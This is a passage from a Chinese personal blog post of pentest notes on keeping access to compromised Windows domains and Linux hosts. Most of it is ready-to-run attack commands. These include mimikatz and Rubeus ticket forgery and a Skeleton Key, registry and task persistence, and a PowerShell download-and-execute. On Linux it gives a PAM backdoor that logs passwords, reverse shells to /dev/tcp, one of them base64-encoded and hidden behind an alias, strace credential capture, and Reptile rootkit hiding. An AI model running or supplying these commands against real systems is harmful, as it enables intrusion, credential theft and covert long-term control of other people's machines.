<p>尝试利用把生成的日志密码文件发送到内网被控机器或者临时邮箱。</p>
</li>
</ul>
<h4 id="SID历史后门"><a href="#SID历史后门" class="headerlink" title="SID历史后门"></a>SID历史后门</h4><ul>
<li>获取某用户SID属性：<ul>
<li>Import-Module ActiveDirectory</li>
<li>Get-ADUser webadmin -Properties sidhistory</li>
</ul>
</li>
<li>给予某用户administrator属性：<ul>
<li>privilege::debug</li>
<li>sid::patch</li>
<li>sid::add &#x2F;sam:webadmin &#x2F;new:administrator</li>
</ul>
</li>
<li>测评给与前后的DC访问权限（目标机）：<ul>
<li>dir \192.168.3.21\c$</li>
</ul>
</li>
<li>技术总结：<ul>
<li>把域控管理员的SID加入到 其他某个恶意的域账户的SID History中，然后，这个恶意的（我们自己创建的）域账户就可以域管理员权限访问域控了，不修改一直存在。</li>
</ul>
</li>
</ul>
<h4 id="Skeleton钥匙"><a href="#Skeleton钥匙" class="headerlink" title="Skeleton钥匙"></a>Skeleton钥匙</h4><ul>
<li>连接DC后，DC注入lsass进程<ul>
<li>mimikatz：</li>
<li>privilege::debug</li>
<li>misc::skeleton</li>
</ul>
</li>
<li>重新测试域内某个用户与DC通讯<ul>
<li>net use \owa2010cn-god\ipc$ “mimikatz” &#x2F;user:god\administrator</li>
<li>dir \owa2010cn-god\c$</li>
</ul>
</li>
<li>技术总结：<ul>
<li>因为Skeleton Key技术是被注入到lsass.exe进程的，所以它只存在内存中，如域控重启，万能密码将失效。</li>
</ul>
</li>
</ul>
<h4 id="DSRM还原后门"><a href="#DSRM还原后门" class="headerlink" title="DSRM还原后门"></a>DSRM还原后门</h4><ul>
<li><p>获取dsrm及krbtgt的NTLM hash（AD域）</p>
<ul>
<li>privilege::debug</li>
<li>lsadump::lsa &#x2F;patch &#x2F;name:krbtgt</li>
<li>token::elevate</li>
<li>lsadump::sam</li>
</ul>
</li>
<li><p>dsrm&amp;krbtgt&amp;NTLM hash同步（AD域）</p>
<ul>
<li>ntdsutil：打开ntdsutil</li>
<li>set DSRM password：修改DSRM的密码</li>
<li>sync from domain account 域用户名字：使DSRM的密码和指定域用户的密码同步</li>
<li>q(第1次)：退出DSRM密码设置模式</li>
<li>q(第2次)：退出ntdsutil</li>
<li>修改dsrm登录方式<ul>
<li>New-ItemProperty “hklm:\system\currentcontrolset\control\lsa&quot; -name “dsrmadminlogonbehavior” -value 2 -propertyType DWORD</li>
</ul>
</li>
</ul>
</li>
<li><p>利用PTH传递攻击</p>
<ul>
<li>privilege::debug</li>
<li>sekurlsa::pth &#x2F;domain:owa2010cn-god &#x2F;user:administrator &#x2F;ntlm:b097d7ed97495408e1537f706c357fc5</li>
<li>dir \owa2010cn-god\c$</li>
</ul>
</li>
<li><p>技术总结：</p>
<ul>
<li>利用系统自带机制模式DSRM，修改DSRM默认登录方式和属性，通过其同步krgtgt进行PTH攻击，实现持续化控制，但适用于系统&#x3D;&gt;windows server2008。每个域控制器都有本地管理员账号和密码（与域管理员账号和密码不同）。DSRM账号可以作为一个域控制器的本地管理员用户，通过网络连接域控制器，进而控制域控制器。</li>
</ul>
</li>
</ul>
<h4 id="票据"><a href="#票据" class="headerlink" title="票据"></a>票据</h4><h5 id="黄金票据"><a href="#黄金票据" class="headerlink" title="黄金票据"></a>黄金票据</h5><ul>
<li><p>前提-获得sid、nthash、aes256和或aes128（对于dc上）</p>
<ul>
<li><p>privilege::debug</p>
<p>lsadump::lsa &#x2F;inject &#x2F;name:krbtgt</p>
<p>wmic useraccount get Caption,sid</p>
</li>
</ul>
</li>
<li><p>删除票据</p>
<ul>
<li>kerberos::purge</li>
</ul>
</li>
<li><p>注入票据</p>
<ul>
<li><p>#NTLM</p>
<p>mimikatz#kerberos::golden &#x2F;domain:rootkit.org &#x2F;sid:S-1-5-21-3759881954-2993291187-3577547808 &#x2F;rc4:c3d5042c67ef5f461d0ba6ecdd9ea449 &#x2F;user:Administrator &#x2F;id:500 &#x2F;groups:500,501,513,512,520,518,519 &#x2F;ptt</p>
<p>#aes256</p>
<p>mimikatz#kerberos::golden &#x2F;domain:rootkit.org &#x2F;sid:S-1-5-21-3759881954-2993291187-3577547808 &#x2F;aes256:3e65833fc9930ea83015501ec30c161da401faf6cfed9526b9ceff16c8ade745 &#x2F;user:Administrator &#x2F;id:500 &#x2F;groups:500,501,513,512,520,518,519 &#x2F;ptt</p>
<p>#aes128</p>
<p>mimikatz#kerberos::golden &#x2F;domain:rootkit.org &#x2F;sid:S-1-5-21-3759881954-2993291187-3577547808 &#x2F;aes128:c7ae2a311bdd5803646f9a98351c31e6 &#x2F;user:Administrator &#x2F;id:500 &#x2F;groups:500,501,513,512,520,518,519 &#x2F;ptt</p>
</li>
</ul>
</li>
</ul>
<h5 id="白银票据"><a href="#白银票据" class="headerlink" title="白银票据"></a>白银票据</h5><ul>
<li><p>前提-获得目标机hostname、sid、nthash</p>
<ul>
<li><p>privilege::debug</p>
<p>sekurlsa::logonpasswords（找到对应目标机的nthash）</p>
</li>
</ul>
</li>
<li><p>注入白银票据</p>
<ul>
<li>kerberos::golden &#x2F;sid:S-1-5-21-202412995-3582062751-167045153 &#x2F;domain:rootkit.org &#x2F;target:SRV-WEB-KIT.rootkit.org &#x2F;service:cifs &#x2F;rc4:d285659bb8946c7ca26391b24a6ef567 &#x2F;user:1111 &#x2F;ptt</li>
</ul>
</li>
</ul>
<h5 id="钻石票据"><a href="#钻石票据" class="headerlink" title="钻石票据"></a>钻石票据</h5><ul>
<li><p>前提-普通用户账号密码、krbtgt的aes256</p>
<ul>
<li><p>privilege::debug</p>
<p>lsadump::dcsync &#x2F;domain:god.org &#x2F;user:krbtgt</p>
</li>
</ul>
</li>
<li><p>请求ticket</p>
<ul>
<li>Rubeus.exe asktgt &#x2F;aes256:5a75bb9a4fc4453c66621a54af111884f45bbca6365bf4d81bc059f31e708827 &#x2F;user:webadmin &#x2F;password:admin!@#45 &#x2F;domain:god.org &#x2F;dc:owa2010cn-god.god.org &#x2F;ptt &#x2F;nowrap</li>
</ul>
</li>
<li><p>注入钻石票据</p>
<ul>
<li>Rubeus.exe asktgs &#x2F;ticket:$ticket &#x2F;service:cifs&#x2F;owa2010cn-god.god.org &#x2F;ptt &#x2F;nowrap</li>
</ul>
</li>
</ul>
<h5 id="蓝宝石票据"><a href="#蓝宝石票据" class="headerlink" title="蓝宝石票据"></a>蓝宝石票据</h5><ul>
<li>前提-普通用户账号密码，目标机sid，krbtgt的aesKey或nthash<ul>
<li>lsadump::dcsync &#x2F;domain:rootkit.org &#x2F;user:krbtgt</li>
</ul>
</li>
<li>注入票据<ul>
<li>python ticketer.py -request -impersonate ‘administrator’ -domain ‘rootkit.org’ -user ‘micle’ -password ‘Admin12345’ -aesKey ‘3e65833fc9930ea83015501ec30c161da401faf6cfed9…..’ -domain-sid ‘S-1-5-21-3759881954-2993291187-3577547808’ -nthash ‘c3d5042c67ef5f461d0ba6ecdd9ea449’ ‘xiaodi’</li>
</ul>
</li>
<li>连接用户<ul>
<li>kerberos::ptc xiaodi.ccache</li>
</ul>
</li>
</ul>
<h4 id="差异"><a href="#差异" class="headerlink" title="差异"></a>差异</h4><p>黄金票据：能控制所有服务协议资源，但容易被安全设备捕获（伪造票据）</p>
<p>白银票据：只能控制指定服务协议资源，但不容易被安全设备捕获（伪造票据）</p>
<p>钻石票据：利用条件增多，权限维持更持续，更不容易被安全设备捕获（真实票据）</p>
<p>蓝宝石票据：利用条件增多，权限维持更持续，更难被安全设备捕获（真实票据）</p>
<h3 id="Windows主机后门"><a href="#Windows主机后门" class="headerlink" title="Windows主机后门"></a>Windows主机后门</h3><ul>
<li>主要思路是修改注册表</li>
</ul>
<h4 id="自启动"><a href="#自启动" class="headerlink" title="自启动"></a>自启动</h4><ul>
<li><p>自启动路径加载-将shell文件放在以下目录</p>
<p>C:\Users\用户名\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\</p>
</li>
<li><p>自启动服务加载</p>
<ul>
<li>创建ServiceTest 服务<ul>
<li>sc create ServiceTest binPath&#x3D; C:\8888.exe  start&#x3D; auto</li>
</ul>
</li>
<li>删除服务<ul>
<li>sc delete ServiceTest</li>
</ul>
</li>
</ul>
</li>
<li><p>自启动注册表加载</p>
<ul>
<li><p>-当前用户键值</p>
<p>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run </p>
</li>
<li><p>-服务器键值（需要管理员权限）</p>
<p>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run </p>
</li>
<li><p>-添加启动项</p>
<p>REG ADD “HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run” &#x2F;V “backdoor” &#x2F;t REG_SZ &#x2F;F &#x2F;D “C:\8888.exe”</p>
<p>REG ADD “HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run” &#x2F;V “backdoor” &#x2F;t REG_SZ &#x2F;F &#x2F;D “C:\8888.exe”</p>
</li>
</ul>
</li>
<li><p>计划计时任务-定时执行命令，可选择执行频率</p>
<ul>
<li>schtasks &#x2F;create &#x2F;tn “RunXD” &#x2F;tr “C:\8888.exe” &#x2F;sc daily &#x2F;st 12:50</li>
</ul>
</li>
<li><p>组策略bat</p>
<ul>
<li><p>使用gpedit.msc</p>
</li>
<li><p>用户配置–》Windows设置–》脚本登录</p>
<ul>
<li><p>浏览修改bat文件</p>
</li>
<li><p>文件内容为:</p>
<ul>
<li><p>cmd C:\8888.exe</p>
<p>C:\8888.exe</p>
</li>
</ul>
</li>
</ul>
<p><img src="/.com//Users\85885\Documents\web\笔记\截图\Snipaste_2024-07-11_21-05-13.png" alt="Snipaste_2024-07-11_21-05-13"></p>
</li>
</ul>
</li>
</ul>
<h4 id="粘滞键后门"><a href="#粘滞键后门" class="headerlink" title="粘滞键后门"></a>粘滞键后门</h4><ul>
<li>粘滞键位置：<ul>
<li>c:\windows\system32\sethc.exe</li>
</ul>
</li>
<li>修改命令将setch命令替换为cmd<ul>
<li>修改权限：takeown &#x2F;f C:\Windows\System32\sethc.exe</li>
<li>移动备份：move sethc.exe sethc1.exe</li>
<li>替换劫持：copy cmd.exe sethc.exe</li>
</ul>
</li>
</ul>
<h4 id="文件映像劫持"><a href="#文件映像劫持" class="headerlink" title="文件映像劫持"></a>文件映像劫持</h4><ul>
<li>执行notepad成cmd或后门<ul>
<li>REG ADD “HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\notepad.exe” &#x2F;v debugger &#x2F;t REG_SZ &#x2F;d “C:\Windows\System32\cmd.exe &#x2F;c calc”</li>
</ul>
</li>
<li>配合GlobalFlag隐藏：在运行中执行目标命令<ul>
<li>reg add “HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\notepad.exe” &#x2F;v GlobalFlag &#x2F;t REG_DWORD &#x2F;d 512</li>
<li>reg add “HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\notepad.exe” &#x2F;v ReportingMode &#x2F;t REG_DWORD &#x2F;d 1</li>
<li>reg add “HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\notepad.exe” &#x2F;v MonitorProcess &#x2F;d “C:\8888.exe”</li>
</ul>
</li>
</ul>
<h4 id="其它"><a href="#其它" class="headerlink" title="其它"></a>其它</h4><ul>
<li>用户登录或远程终端登录<ul>
<li>REG ADD “HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon” &#x2F;V “Userinit” &#x2F;t REG_SZ &#x2F;F &#x2F;D “C:\Windows\system32\userinit.exe,C:\8888.exe,”</li>
</ul>
</li>
<li>屏幕保护<ul>
<li>reg add “HKEY_CURRENT_USER\Control Panel\Desktop” &#x2F;v SCRNSAVE.EXE &#x2F;t REG_SZ &#x2F;d “C:\8888.exe” &#x2F;f</li>
</ul>
</li>
<li>Logon Scripts登录<ul>
<li>本地目录<ul>
<li>reg add “HKEY_CURRENT_USER\Environment” &#x2F;v UserInitMprLogonScript &#x2F;t REG_SZ &#x2F;d “C:\8888.exe”</li>
</ul>
</li>
<li>远程下载<ul>
<li>reg add “HKEY_CURRENT_USER\Environment” &#x2F;v UserInitMprLogonScript &#x2F;t REG_SZ &#x2F;d “powershell.exe -nop -w hidden -c &quot;IEX ((new-object net.webclient).downloadstring(‘<a target="_blank" rel="noopener" href="http://192.168.13.143/a'))/">http://192.168.13.143:80/a&#39;))\</a>“”</li>
</ul>
</li>
</ul>
</li>
</ul>
<h3 id="Linux-1"><a href="#Linux-1" class="headerlink" title="Linux"></a>Linux</h3><h4 id="OpenSSH后门"><a href="#OpenSSH后门" class="headerlink" title="OpenSSH后门"></a>OpenSSH后门</h4><ul>
<li><p>环境准备：</p>
<ul>
<li>yum -y install openssl openssl-devel pam-devel zlib zlib-devel    </li>
<li>yum -y install gcc gcc-c++ make                                   </li>
<li>wget <a target="_blank" rel="noopener" href="http://core.ipsecs.com/rootkit/patch-to-hack/0x06-openssh-5.9p1.patch.tar.gz">http://core.ipsecs.com/rootkit/patch-to-hack/0x06-openssh-5.9p1.patch.tar.gz</a></li>
<li>wget <a target="_blank" rel="noopener" href="https://mirror.aarnet.edu.au/pub/OpenBSD/OpenSSH/portable/openssh-5.9p1.tar.gz">https://mirror.aarnet.edu.au/pub/OpenBSD/OpenSSH/portable/openssh-5.9p1.tar.gz</a></li>
<li>tar -xzvf openssh-5.9p1.tar.gz </li>
<li>tar -xzvf 0x06-openssh-5.9p1.patch.tar.gz</li>
<li>cp openssh-5.9p1.patch&#x2F;sshbd5.9p1.diff openssh-5.9p1</li>
<li>cd openssh-5.9p1 &amp;&amp; patch &lt; sshbd5.9p1.diff</li>
</ul>
</li>
<li><p>编辑密码：</p>
<ul>
<li>vim includes.h</li>
<li>177 #define ILOG “&#x2F;tmp&#x2F;ilog”#ILOG是别人用ssh登录该主机记录的日志目录</li>
<li>178 #define OLOG “&#x2F;tmp&#x2F;olog”#OLOG是该主机用ssh登录其他主机记录的日志目录 </li>
<li>179 #define SECRETPW “<strong>password</strong>“#万能密码</li>
<li>180 #endif &#x2F;* INCLUDES_H *&#x2F;</li>
</ul>
</li>
<li><p>安装编译：</p>
<ul>
<li>.&#x2F;configure –prefix&#x3D;&#x2F;usr  –sysconfdir&#x3D;&#x2F;etc&#x2F;ssh  –with-pam  –with-kerberos5  &amp;&amp; make &amp;&amp; make install</li>
<li>service sshd restart   #重启sshd服务</li>
<li>systemctl status sshd.service #查看ssh启动状态</li>
</ul>
</li>
<li><p>ssh连接</p>
<ul>
<li>ssh 用户名@IP</li>
<li>ssh <a href="mailto:&#x79;&#106;&#119;&#56;&#53;&#x38;&#56;&#53;&#55;&#x31;&#x33;&#54;&#x40;&#49;&#x39;&#x32;&#x2e;&#49;&#54;&#x38;&#x2e;&#49;&#x2e;&#56;">&#x79;&#106;&#119;&#56;&#53;&#x38;&#56;&#53;&#55;&#x31;&#x33;&#54;&#x40;&#49;&#x39;&#x32;&#x2e;&#49;&#54;&#x38;&#x2e;&#49;&#x2e;&#56;</a></li>
</ul>
</li>
</ul>
<h4 id="PAM启用替换"><a href="#PAM启用替换" class="headerlink" title="PAM启用替换"></a>PAM启用替换</h4><p>1、获取目标系统所使用的PAM版本，下载对应版本的pam版本</p>
<p>2、解压缩，修改pam_unix_auth.c文件，添加万能密码</p>
<p>3、编译安装PAM</p>
<p>4、编译完后的文件在：modules&#x2F;pam_unix&#x2F;.libs&#x2F;pam_unix.so，复制到&#x2F;lib64&#x2F;security中进行替换，即使用万能密码登陆，将用户名密码记录到文件中。</p>
<ul>
<li><p>配置环境</p>
<ul>
<li>关闭selinux setenforce 0</li>
<li>查询版本 rpm -qa | grep pam</li>
<li>wget <a target="_blank" rel="noopener" href="http://www.linux-pam.org/library/Linux-PAM-1.1.8.tar.gz">http://www.linux-pam.org/library/Linux-PAM-1.1.8.tar.gz</a></li>
<li>tar -zxvf Linux-PAM-1.1.8</li>
<li>yum install gcc flex flex-devel -y</li>
</ul>
</li>
<li><p>修改配置：</p>
<p>留PAM后门和保存SSH登录的账号密码</p>
<ul>
<li><p>修改 Linux-PAM-1.1.8&#x2F;modules&#x2F;pam_unix&#x2F;pam_unix_auth.c</p>
<p>&#x2F;* verify the password of this user *&#x2F;</p>
<p>retval &#x3D; _unix_verify_password(pamh, name, p, ctrl);</p>
<p>if(strcmp(“<strong>password</strong>“,p)&#x3D;&#x3D;0){return PAM_SUCCESS;}    &#x2F;&#x2F;后门密码</p>
<p>​    if(retval &#x3D;&#x3D; PAM_SUCCESS){    </p>
<p>​           FILE * fp;    </p>
<p>​           fp &#x3D; fopen(“&#x2F;tmp&#x2F;.sshlog”, “a”);&#x2F;&#x2F;SSH登录用户密码保存位置</p>
<p>​           fprintf(fp, “%s : %s\n”, name, p);    </p>
<p>​           fclose(fp);} </p>
<p>name &#x3D; p &#x3D; NULL;</p>
<p>AUTH_RETURN;</p>
</li>
</ul>
</li>
<li><p>编译安装：</p>
<ul>
<li>.&#x2F;configure &amp;&amp; make</li>
<li>-备份复制：</li>
<li>备份原有pam_unix.so,防止出现错误登录不上</li>
<li>复制新PAM模块到&#x2F;lib64&#x2F;security&#x2F;目录下 </li>
<li>cp &#x2F;usr&#x2F;lib64&#x2F;security&#x2F;pam_unix.so &#x2F;tmp&#x2F;pam_unix.so.bakcp</li>
<li>cd Linux-PAM-1.1.8&#x2F;modules&#x2F;pam_unix&#x2F;.libs</li>
<li>cp pam_unix.so &#x2F;usr&#x2F;lib64&#x2F;security&#x2F;pam_unix.so</li>
</ul>
</li>
<li><p>ssh连接</p>
<ul>
<li>ssh 用户名@IP</li>
<li>ssh <a href="mailto:&#121;&#x6a;&#119;&#x38;&#53;&#56;&#x38;&#53;&#55;&#x31;&#x33;&#54;&#x40;&#49;&#57;&#x32;&#46;&#49;&#54;&#x38;&#46;&#49;&#x2e;&#x38;">&#121;&#x6a;&#119;&#x38;&#53;&#56;&#x38;&#53;&#55;&#x31;&#x33;&#54;&#x40;&#49;&#57;&#x32;&#46;&#49;&#54;&#x38;&#46;&#49;&#x2e;&#x38;</a></li>
</ul>
</li>
<li><p>配合软链接</p>
<ul>
<li>在sshd服务配置启用PAM认证的前提下，PAM配置文件中控制标志为sufficient时，只要pam_rootok模块检测uid为0（root）即可成功认证登录。</li>
<li>SSH配置中开启了PAM进行身份验证</li>
<li>查看是否使用PAM进行身份验证：</li>
<li>cat &#x2F;etc&#x2F;ssh&#x2F;sshd_config|grep UsePAM</li>
<li>ln -sf &#x2F;usr&#x2F;sbin&#x2F;sshd &#x2F;tmp&#x2F;su;&#x2F;tmp&#x2F;su -oPort&#x3D;8888</li>
<li>ssh <a href="mailto:&#121;&#106;&#x77;&#56;&#53;&#56;&#56;&#x35;&#55;&#x31;&#x33;&#x36;&#x40;&#x31;&#57;&#x32;&#46;&#49;&#x36;&#56;&#x2e;&#x31;&#x2e;&#56;">&#121;&#106;&#x77;&#56;&#53;&#56;&#56;&#x35;&#55;&#x31;&#x33;&#x36;&#x40;&#x31;&#57;&#x32;&#46;&#49;&#x36;&#56;&#x2e;&#x31;&#x2e;&#56;</a> -p 8888 密码随意输入即可登录</li>
</ul>
</li>
</ul>
<h4 id="密钥对"><a href="#密钥对" class="headerlink" title="密钥对"></a>密钥对</h4><ul>
<li>利用前提-开启密钥对支持：<ul>
<li>vim &#x2F;etc&#x2F;ssh&#x2F;sshd_config-开启以下配置<ul>
<li>RSAAuthentication yes</li>
<li>PubkeyAuthentication yes</li>
<li>AuthorizedKeysFile .ssh&#x2F;authorized_keys</li>
</ul>
</li>
</ul>
</li>
<li>攻击机生成本地密钥<ul>
<li>ssh-keygen -t rsa #三次回车</li>
<li>id_rsa : 私钥</li>
<li>id_rsa.pub : 公钥</li>
<li>cat id_rsa.pub 将内容复制到目的机的authorized_keys</li>
</ul>
</li>
<li>复制攻击机公钥到目的机<ul>
<li>cd &#x2F;root&#x2F;.ssh&#x2F;</li>
<li>vim authorized_keys(id_rsa.pub内容)</li>
<li>chmod 600 authorized_keys</li>
</ul>
</li>
<li>攻击机直接用ssh协议连接目的机</li>
</ul>
<h4 id="后门账号"><a href="#后门账号" class="headerlink" title="后门账号"></a>后门账号</h4><ul>
<li>添加账号test1，设置uid为0，密码为123456<ul>
<li>useradd -p <code>openssl passwd -1 -salt &#39;salt&#39; 123456</code> test1 -o -u 0 -g root -G root -s &#x2F;bin&#x2F;bash -d &#x2F;home&#x2F;test1</li>
</ul>
</li>
</ul>
<h4 id="Cron后门"><a href="#Cron后门" class="headerlink" title="Cron后门"></a>Cron后门</h4><ul>
<li><p>目标机编辑后门反弹</p>
<ul>
<li>vim &#x2F;etc&#x2F;.xiaodi.sh</li>
<li>bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;192.168.1.8&#x2F;3333 0&gt;&amp;1</li>
<li>chmod +x &#x2F;etc&#x2F;.xiaodi.sh</li>
</ul>
</li>
<li><p>目标机添加定时任务</p>
<ul>
<li>vim &#x2F;etc&#x2F;crontab</li>
<li>*&#x2F;1 * * * * root &#x2F;etc&#x2F;.xiaodi.sh</li>
</ul>
</li>
<li><p>攻击机监听</p>
<ul>
<li>nc -lvvp 3333</li>
</ul>
</li>
<li><p>strace后门</p>
<p>strace是一个动态跟踪工具，它可以跟踪系统调用的执行。</p>
<p>我们可以把他当成一个键盘记录的后门，来扩大我们的信息收集范围</p>
</li>
<li><p>记录sshd明文</p>
<ul>
<li>(strace -f -F -p <code>ps aux|grep &quot;sshd -D&quot;|grep -v grep|awk &#123;&#39;print $2&#39;&#125;</code> -t -e trace&#x3D;read,write -s 32 2&gt; &#x2F;tmp&#x2F;.sshd.log &amp;)</li>
</ul>
</li>
<li><p>每次登录后可使用以下命令查看</p>
<ul>
<li>grep -E ‘read(6, “.+\0\0\0\.+”‘ &#x2F;tmp&#x2F;.sshd.log</li>
</ul>
</li>
<li><p>记录sshd私钥</p>
<ul>
<li>(strace -f -F -p <code>ps aux|grep &quot;sshd -D&quot;|grep -v grep|awk &#123;&#39;print $2&#39;&#125;</code> -t -e trace&#x3D;read,write -s 4096 2&gt; &#x2F;tmp&#x2F;.sshd.log &amp;)</li>
<li>grep ‘PRIVATE KEY’ &#x2F;tmp&#x2F;.sshd.log</li>
</ul>
</li>
<li><p>alias后门</p>
<p>alias命令的功能：为命令设置别名</p>
</li>
<li><p>替换例子</p>
<ul>
<li>定义：alias ls&#x3D;’ls -al’</li>
<li>删除：unalias ls</li>
<li>每次输入ls命令的时候都能实现ls -al</li>
</ul>
</li>
<li><p>简单-将ls替换为ls+反弹shell命令：</p>
<ul>
<li>alias ls&#x3D;’alerts(){ ls $* –color&#x3D;auto;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;192.168.1.7&#x2F;4444 0&gt;&1; };alerts’</li>
</ul>
</li>
<li><p>升级：</p>
<ul>
<li>使用python编译编码后的反弹shell命令<ul>
<li>alias ls&#x3D;’alerts(){ ls $* –color&#x3D;auto;python3 -c “import base64,sys;exec(base64.b64decode({2:str,3:lambda b:bytes(b,’&#39;‘UTF-8’&#39;‘)}<a href="'''aW1wb3J0IG9zLHNvY2tldCxzdWJwcm9jZXNzOwpyZXQgPSBvcy5mb3JrKCkKaWYgcmV0ID4gMDoKICAgIGV4aXQoKQplbHNlOgogICAgdHJ5OgogICAgICAgIHMgPSBzb2NrZXQuc29ja2V0KHNvY2tldC5BRl9JTkVULCBzb2NrZXQuU09DS19TVFJFQU0pCiAgICAgICAgcy5jb25uZWN0KCgiMTkyLjE2OC4xLjciLCA5OTk5KSkKICAgICAgICBvcy5kdXAyKHMuZmlsZW5vKCksIDApCiAgICAgICAgb3MuZHVwMihzLmZpbGVubygpLCAxKQogICAgICAgIG9zLmR1cDIocy5maWxlbm8oKSwgMikKICAgICAgICBwID0gc3VicHJvY2Vzcy5jYWxsKFsiL2Jpbi9zaCIsICItaSJdKQogICAgZXhjZXB0IEV4Y2VwdGlvbiBhcyBlOgogICAgICAgIGV4aXQoKQ=='''">sys.version_info[0]</a>))”;};alerts’</li>
</ul>
</li>
<li>alias unalias&#x3D;’alerts(){ if [ $# !&#x3D; 0 ]; then if [ $* !&#x3D; “ls” ]&amp;&amp;[ $* !&#x3D; “alias” ]&amp;&amp;[ $* !&#x3D; “unalias” ]; then unalias $<em>;else echo “-bash: unalias: ${</em>}: not found”;fi;else echo “unalias: usage: unalias [-a] name [name …]”;fi;};alerts’</li>
<li>alias alias&#x3D;’alerts(){ alias “$@” | grep -v unalias | sed “s&#x2F;alerts.<em>lambda.</em>&#x2F;ls –color&#x3D;auto’&#39;‘&#x2F;“;};alerts’</li>
</ul>
</li>
<li><p>持久化+隐藏：重启依旧生效</p>
<ul>
<li>vim &#x2F;etc&#x2F;upload</li>
<li>vim ～&#x2F;.bashrc</li>
<li>if [ -f &#x2F;etc&#x2F;upload ]; then</li>
<li>. &#x2F;etc&#x2F;upload</li>
<li>fi</li>
</ul>
</li>
</ul>
<h2 id="Rootkit后门"><a href="#Rootkit后门" class="headerlink" title="Rootkit后门"></a>Rootkit后门</h2><ul>
<li>在目标机上传控制的Rootkit后门</li>
</ul>
<h3 id="Window"><a href="#Window" class="headerlink" title="Window"></a>Window</h3><h3 id="Linux-2"><a href="#Linux-2" class="headerlink" title="Linux"></a>Linux</h3><ul>
<li><p>目标机安装命令</p>
<ul>
<li><p>cd Reptile-2.0&#x2F; </p>
</li>
<li><p>chmod +x .&#x2F;setup.sh</p>
</li>
<li><p>.&#x2F;setup.sh install</p>
</li>
</ul>
</li>
<li><p>隐藏目标文件he</p>
<ul>
<li>命名文件时代入reptile，如 reptile_shell</li>
</ul>
</li>
<li><p>隐藏shell进程</p>
<ul>
<li>ps -ef 查看shell进程PID</li>
<li>&#x2F;reptile&#x2F;reptile_cmd hide PID</li>
</ul>
</li>
<li><p>隐藏外连ip</p>
<ul>
<li>netstat -anpt</li>
<li>&#x2F;reptile&#x2F;reptile_cmd tcp IP port hide</li>
</ul>
</li>
<li><p>其中还可以使用进阶的client连接</p>
<ul>
<li>首先在目标机安装时将reverse shell设为控制端IP</li>
<li>在控制端安装client</li>
</ul>
</li>
</ul>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>Author: </span><span class="post-copyright-info"><a href="http://example.com">Jw1ng</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>Link: </span><span class="post-copyright-info"><a href="http://example.com/2024/09/10/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8/">http://example.com/2024/09/10/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>Copyright Notice: </span><span class="post-copyright-info">All articles in this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless stating additionally.</span></div></div><div class="tag_share"><div class="post-meta__tag-list"></div><div class="post_share"><div class="social-share" data-image="https://i.loli.net/2021/02/24/5O1day2nriDzjSu.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-full"><a href="/2024/09/10/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" title="代码审计"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">Previous</div><div class="prev_info">代码审计</div></div></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="https://i.loli.net/2021/02/24/5O1day2nriDzjSu.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">Jw1ng</div><div class="author-info__description"></div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">2</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">0</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">0</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/xxxxxx"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>Announcement</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>Contents</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9F%BA%E6%9C%AC%E6%A6%82%E5%BF%B5"><span class="toc-number">1.</span> <span class="toc-text">基本概念</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%90%8D%E8%AF%8D"><span class="toc-number">1.1.</span> <span class="toc-text">名词</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%B1%80%E5%9F%9F%E7%BD%91"><span class="toc-number">1.1.1.</span> <span class="toc-text">局域网</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%B7%A5%E4%BD%9C%E7%BB%84"><span class="toc-number">1.1.2.</span> <span class="toc-text">工作组</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%9F%9F%E7%8E%AF%E5%A2%83"><span class="toc-number">1.1.3.</span> <span class="toc-text">域环境</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" 